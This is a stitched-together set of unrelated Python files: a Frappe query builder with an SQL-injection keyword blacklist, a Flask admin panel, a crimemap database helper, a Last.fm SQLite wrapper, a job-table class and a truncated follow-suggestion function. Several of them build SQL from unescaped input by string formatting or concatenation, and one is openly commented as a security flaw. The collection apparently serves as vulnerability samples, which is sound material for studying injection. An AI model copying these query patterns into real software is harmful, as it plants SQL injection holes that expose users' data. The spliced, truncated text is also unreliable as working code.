		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''

		sub_query_regex = re.compile("^.*[,();].*")
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Use of sub-query or function is restricted'), frappe.DataError)

		def _is_query(field):
			if re.compile("^(select|delete|update|drop|create)\s").match(field):
				_raise_exception()

			elif re.compile("\s*[a-zA-z]*\s*( from | group by | order by | where | join )").match(field):                    
				_raise_exception()

		for field in self.fields:
			if sub_query_regex.match(field):
				if any(keyword in field.lower().split() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("({0}".format(keyword) in field.lower() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() for keyword in blacklisted_functions):
					_raise_exception()

			if re.compile("[a-zA-Z]+\s*'").match(field):                    
				_raise_exception()

			if re.compile('[a-zA-Z]+\s*,').match(field):                    
				_raise_exception()

			_is_query(field)


	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	kwargs.pop('ignore_permissions', None)

	# If doctype is child table
	if frappe.is_table(doctype):
		# Example frappe.db.get_list('Purchase Receipt Item', {'parent': 'Purchase Receipt'})
		# Here purchase receipt is the parent doctype of the child doctype Purchase Receipt Item

		if not kwargs.get('parent'):
			frappe.flags.error_message = _('Parent is required to get child table data')
			raise frappe.PermissionError(doctype)

		check_parent_permission(kwargs.get('parent'), doctype)
		del kwargs['parent']

	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

import functools

from flask import(
    Blueprint, flash, redirect, render_template, request, session, url_for, g
)
from werkzeug.security import check_password_hash, generate_password_hash

from DefinitelyNotTwitter.database import get_db
from . import user
from . import database as db
from . import user as user
from DefinitelyNotTwitter.user import get_user
from DefinitelyNotTwitter.auth import login_required

bp = Blueprint('admin', __name__, url_prefix='/admin')

def admin_required(view):
    @functools.wraps(view)
    def wrapped_view(**kwargs):
        if g.user is None:
            return redirect(url_for('auth.login'))
        elif g.user['admin'] != 1:
            return redirect(url_for('blog.feedpage', page=0))

        return view(**kwargs)
    return wrapped_view

@bp.route('/user_view')
@bp.route('/user_view/<sort>')
@admin_required
def user_view(sort='id.asc'):
    db = get_db()
    sortBy = sort.split('.')[0]
    sortOrder = sort.split('.')[1]


    query = 'SELECT * FROM user AS u LEFT OUTER JOIN (SELECT uid, count(uid) AS follower FROM follows GROUP BY uid) AS f ON u.id = f.uid ORDER BY ? {}'.format(sortOrder)                    
    users = db.execute(
        query, (sortBy,)                    
    ).fetchall()
    return render_template('admin/userview.html', users = users, sort='{}.{}'.format(sortBy, sortOrder))

@bp.route('/')
@bp.route('/<int:page>')
@admin_required
def admin_panel(page=0):

    db = get_db()

    postcount = g.postcount

    pagecount = int(postcount / 5 + 1)

    posts = db.execute(
        'SELECT * FROM post JOIN user WHERE post.uid = user.id AND post.reviewed = 1 ORDER BY created DESC LIMIT 5 OFFSET ?', (str(page*5),)
    ).fetchall()

    return render_template('admin/panel.html', posts = posts, pagecount=pagecount, page=page)

@bp.route('/edituser/<int:id>', methods= ('GET', 'POST'))
@admin_required
def edit_user(id):
    user = get_user(id)

    if request.method == 'POST':
        username = request.form['username']
        desc = request.form['desc']
        role = request.form['role']
        adminPwd = request.form['adminPwd']
        db = get_db()
        error = None
        file = None
        imgAdded = False

        # check if the post request has the file part
        if 'file' in request.files:
              f = request.files['file']
              filename = secure_filename(f.filename)
              filetype = filename.rsplit('.', 1)[1].lower()
              f.save(os.path.join(current_app.config['UPLOAD_FOLDER'], str(g.user["id"])+"."+filetype))
              imgAdded = True

        if not check_password_hash(g.user['password'], adminPwd):
            error = 'Incorrect admin password. Correct password required to edit user.'

        if error is None:
            if username is not "":
                db.execute(
                    'UPDATE user SET name = ? WHERE id = ?', (username, id,)
                )
            if desc is not "":
                db.execute(
                    'UPDATE user SET descrip = ? WHERE id = ?', (desc, id,)
                )
            if imgAdded:
                db.execute(
                    'UPDATE user SET avatar = 1 WHERE id = ?', (id,)
                )
            if role == 'restricted':
                db.execute(
                    'UPDATE user SET restricted = 1 WHERE id = ?', (id,)
                )
            if role == 'admin':
                db.execute(
                    'UPDATE user SET admin = 1 WHERE id = ?', (id,)
                )
            db.commit()
            return redirect(url_for('user.show_profile', id = user['id']))

        flash(error)

    return render_template('admin/edituser.html', user = user)

@bp.route('/restrict/<int:id>')
@admin_required
def restrict(id):

    db = get_db()
    user = get_user(id)
    error = None

    if user['restricted'] == 1:
        error = "User already restricted."
    elif user['admin'] == 1:
        error = "Cannot restrict admins."

    if error is None:
        db.execute(
            'UPDATE user SET restricted = 1 WHERE id = ?', (id,)
        )
        db.commit()
        return redirect(url_for('admin.user_view'))

    flash(error)
    return redirect(url_for('admin.user_view'))


@bp.route('/unrestrict/<int:id>')
@admin_required
def unrestrict(id):

    db = get_db()
    user = get_user(id)
    error = None

    if user['restricted'] != 1:
        error = "User already unrestricted."

    if error is None:
        db.execute(
            'UPDATE user SET restricted = 0 WHERE id = ?', (id,)
        )
        db.commit()
        return redirect(url_for('admin.user_view'))

    flash(error)
    return redirect(url_for('admin.user_view'))

@bp.route('/delete/<int:id>')
@admin_required
def delete(id):

    db = get_db()

    db.execute(
        'DELETE FROM user WHERE id = ?', (id,)
    )
    db.commit()

    message = "Deleted user!"
    flash(message)
    return redirect(url_for('admin.user_view'))

@bp.route('/promote/<int:id>')
@admin_required
def promote(id):

    db=get_db()
    user = get_user(id)
    error = None

    if user['restricted'] == 1:
        error = 'Cannot promote restricted user.'
    elif user['admin'] == 1:
        error = 'User is already an admin.'

    if error is None:
        db.execute(
            'UPDATE user SET admin = 1 WHERE id = ?', (id,)
        )
        db.commit()
        return redirect(url_for('admin.user_view'))

    flash(error)
    return redirect(url_for('admin.user_view'))

@bp.route('/strip/<int:id>')
@admin_required
def strip(id):

    db=get_db()
    user = get_user(id)
    error = None

    if user['admin'] != 1:
        error = 'User has no admin rights.'

    if error is None:
        db.execute(
            'UPDATE user SET admin = 0 WHERE id = ?', (id,)
        )
        db.commit()
        return redirect(url_for('admin.user_view'))

    flash(error)
    return redirect(url_for('admin.user_view'))


@bp.route('post/release/<int:pid>')
@admin_required
def release_post(pid):
    db = get_db()

    db.execute(
        'UPDATE post SET reviewed = 0 WHERE pid = ?', (pid,)
    )
    db.commit()
    message = "Released post!"
    flash(message)
    return redirect(url_for('admin.admin_panel'))


@bp.route('post/delete/<int:pid>')
@admin_required
def delete_post(pid):

    db = get_db()

    db.execute(
        'DELETE FROM post WHERE pid = ?', (pid,)
    )
    db.commit()
    message="Deleted post!"
    flash(message)
    return redirect(url_for('admin.admin_panel'))


@bp.before_app_request
def load_posts_to_be_reviewed():
    if g.user:
        if g.user['admin'] == 1:
            posts = get_db().execute(
                'SELECT * FROM post WHERE reviewed = 1'
            ).fetchall()
            g.postcount = len(posts)

"""
Database helper class.
"""
import pymysql
import dbconfig

class DBHelper:
    def connect(self, database="crimemap"):
        return pymysql.connect(host='localhost',
                               user=dbconfig.db_user,
                               passwd=dbconfig.db_password,
                               db=database)

    def get_all_inputs(self):
        connection = self.connect()
        try:
            query = "SELECT description FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
            return cursor.fetchall()
        finally:
            connection.close()


    def add_input(self, data):
        connection = self.connect()
        try:
            # This will cause a security flaw.
            query = "INSERT INTO crimes (description) VALUES ('{}');".format(data)                    
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()


    def clear_all(self):
        connection = self.connect()
        try:
            query = "DELETE FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()

''' Contains simple tools for querying the lastfm_tags.db file


Notes
-----
The lastfm database contains 3 tables: tids, tags, tid_tag.
- tids, 1-column table containing the track ids.
- tid_tags, contains 3 columns:
    - tid: rowid of the track id in the tids table.
    - tag: rowid of the tag that belongs to the tid in the same row.
    - val: number between 0 and 100 (guessing this is how accurate the tag is?)
- tags, 1-column table containing the tags.

IMPORTANT: If using this script elsewhere than on Boden then run set_path(new_path) to
set the path of the database. Otherwise it will use the default path, which is the path
to the database on Boden.

Functions
---------
- set_path
    Set path to the lastfm_tags.db.
'''

import sqlite3

path = '/srv/data/msd/lastfm/SQLITE/lastfm_tags.db'

def set_path(new_path):
    ''' Sets new_path as default path for the last.fm database. '''
    global path
    path = new_path

class LastFm:
    ''' Opens a SQLite connection to the last.fm database. Provides methods to perform advanced queries on it.

    Methods
    -------
    - tid_to_tid_nums
        Get tid_num given tid.

    - tid_num_to_tid
        Get tid given tid_num.

    - tid_num_to_tag_nums
        Get tag_num given tid_num.

    - tag_num_to_tag
        Get tag given tag_num.

    - tag_to_tag_num
        Get tag_num given tag.

    - get_tags
        Get a list of tags associated to given tid.

    - get_tags_dict
        Get a dict with tids as keys and a list of its tags as value.

    - tid_tag_count
        Get a dict with tids as keys and its number of tags as value.

    - filter_tags
        Filter list of tids based on minimum number of tags.

    - tag_count
        Get a dict with the tags associated to tids as keys and their count number as values.
    '''

    def __init__(self, path):
        self.conn = sqlite3.connect(path)
        self.c = self.conn.cursor()
    
    def __del__(self): # close the connection gracefully when the object goes out of scope
        self.conn.close()

    def query(self, query):                    
        return self.c.execute(query)                    

    def tid_to_tid_num(self, tid):
        ''' Returns tid_num, given tid. '''

        q = "SELECT rowid FROM tids WHERE tid = '" + tid + "'"                    
        self.query(q)                    
        return self.c.fetchone()[0]

    def tid_num_to_tid(self, tid_num):
        ''' Returns tid, given tid_num. '''

        q = "SELECT tid FROM tids WHERE rowid = '" + str(tid_num) + "'"                    
        self.query(q)                    
        return self.c.fetchone()[0]

    def tid_num_to_tag_nums(self, tid_num):
        ''' Returns list of the associated tag_nums to the given tid_num. '''

        q = "SELECT tag FROM tid_tag WHERE tid = '" + str(tid_num) + "'"                    
        self.query(q)                    
        return [i[0] for i in self.c.fetchall()]
        
    def tag_num_to_tag(self, tag_num):
        ''' Returns tag given tag_num. '''

        q = "SELECT tag FROM tags WHERE rowid = '" + str(tag_num) + "'"                    
        self.query(q)                    
        return self.c.fetchone()[0]

    def tag_to_tag_num(self, tag):
        ''' Returns tag_num given tag. '''

        q = "SELECT rowid FROM tags WHERE tag = '" + tag + "'"                    
        self.query(q)                    
        return self.c.fetchone()[0]

    def get_tids_with_tag(self):
        ''' Gets tids which have at least one tag. '''

        q = "SELECT tid FROM tids"
        self.query(q)                    
        return [i[0] for i in self.c.fetchall()]

    def get_tags(self, tid):
        ''' Gets tags for a given tid. '''
        
        tags = []
        for tag_num in self.tid_num_to_tag_nums(self.tid_to_tid_num(tid)):
            tags.append(self.tag_num_to_tag(tag_num))
        return tags

    def get_tags_dict(self, tids):
        ''' Gets tags for a given list of tids.
        
        Parameters
        ----------
        tids : list
            List containing tids as strings.

        Returns
        -------
        tag_dict : dict
            The keys are the tids from the input list.
            The values are lists of tags for each given tid.
        '''

        tags_dict = {}
        for tid in tids:
            tags_dict[tid] = self.get_tags(tid)
        return tags_dict

    def tag_count(self, tids):
        ''' Gets number of tags for each given tid.
        
        Parameters
        ----------
        tids : list
            List containing tids as strings.

        Returns
        -------
        count_dict : dict
            The keys are the tags associated to any tid from the input list.
            The values are the number of tids which the given tag is associated to.
        '''

        count_dict = {}
        for tag_list in self.get_tags_dict(tids).values():
            for tag in tag_list:
                if tag not in count_dict:
                    count_dict[tag] = 1
                else:
                    count_dict[tag] += 1 
        return count_dict

    def tid_tag_count(self, tids):
        ''' Gets number of tags for each given tid.
        
        Parameters
        ----------
        tids : list
            List containing tids as strings.

        Returns
        -------
        count_dict : dict
            The keys are the tids from the input list.
            The values are the number of tags for each given tid.
        '''

        count_dict = {}
        for tid in tids:
            count_dict[tid] = len(self.get_tags(tid))
        return count_dict

    def filter_tags(self, tids, min_tags):
        ''' Given list of tids, returns list of those with more than min_tags tags. '''

        count_dict = self.tid_tag_count(tids)
        tids_filtered = [tid for tid in tids if count_dict[tid] >= min_tags]
        return tids_filtered




class JobTableActions:

    def __init__(self, database, tableName):

        self.database = database
        self.tableName = tableName

    def jobIsRunning(self, jobName):

        sql = """SELECT * FROM %s 
            WHERE job_name = ?
                AND job_running = 1""" % (self.tableName)

        print sql

        with self.database.cursor() as c:
            rows = c.execute(sql, (jobName,))                    

            if rows:
                return True
        
        return False

    def startJob(self, jobName, jobPlatform):

        sql = """INSERT INTO %s ( 
            job_name, 
            job_started, 
            job_running,
            job_platform ) VALUES (
                ?,
                NOW(),
                1,
                ?
            )""" % (self.tableName)

        print sql

        with self.database.cursor() as c:
            c.execute(sql, (jobName, jobPlatform))
            return c.lastrowid
        
        return -1

    def finishJob(self, jobId, success, message):

        sql = """UPDATE %s
            SET job_finished = NOW(),
                job_running = 0,
                job_successs = ?,
                job_message = ?
            WHERE job_id = ?""" % (self.tableName)

        with self.database.cursor() as c:
            c.execute(sql, (success, message, jobId,))                    
            return True

        return False

"""
Functions for getting suggested users to follow.
"""
import numpy as np


def get_suggest_follow(user_id, cnx):
    """Suggest users to follow.
    Args:
        user_id (int): id of user
        cnx: DB connection
    Returns:
        list: ordered suggestion list of user_ids
    """
    cands = _get_degree_2(user_id, cnx)
    return _sort_similarity(user_id, cands, cnx)


def _sort_similarity(user_id, cands, cnx):
    """Get most similar users according to taste.
    Args:
        user_id (int): id of user to suggest for
        cands (list(int)): ids of candidate users
        cnx: DB connection

    Returns:
        list: cands ordered by decreasing similarity
    """
    users_tmp = ', '.join(list(map(str, [user_id] + cands)))
    sql = '''
    WITH all_songs_analysis AS
    (
        SELECT
            tbl_like.user_id AS user_id,
            danceability,
            energy,
            loudness,
            acousticness,
            instrumentalness,
            liveness,
            valence
        FROM
            tbl_like JOIN tbl_post
            ON (tbl_like.post_id = tbl_post.post_id)
            JOIN tbl_music_analysis
